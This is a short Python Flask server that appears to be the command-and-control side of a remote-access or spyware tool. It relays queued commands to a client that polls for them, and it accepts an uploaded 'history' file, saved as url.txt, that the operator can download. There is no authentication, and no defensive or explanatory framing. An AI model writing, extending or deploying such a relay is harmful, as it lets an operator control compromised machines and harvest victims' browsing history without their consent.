from flask import Flask, request, jsonify, send_file
import os

app = Flask(__name__)
latest_command = ""

@app.route('/receive_command', methods=['POST'])
def receive_command():
    global latest_command
    latest_command = request.json.get("command", "")
    return 'OK'

@app.route('/poll_command')
def poll_command():
    global latest_command
    cmd = latest_command
    latest_command = ""
    return jsonify({"command": cmd})

@app.route('/upload_history', methods=['POST'])
def upload_history():
    file = request.files['file']
    file.save("url.txt")
    return 'Received'

@app.route('/get_url_file')
def get_url_file():
    return send_file("url.txt", as_attachment=True)

if __name__ == '__main__':
    app.run()
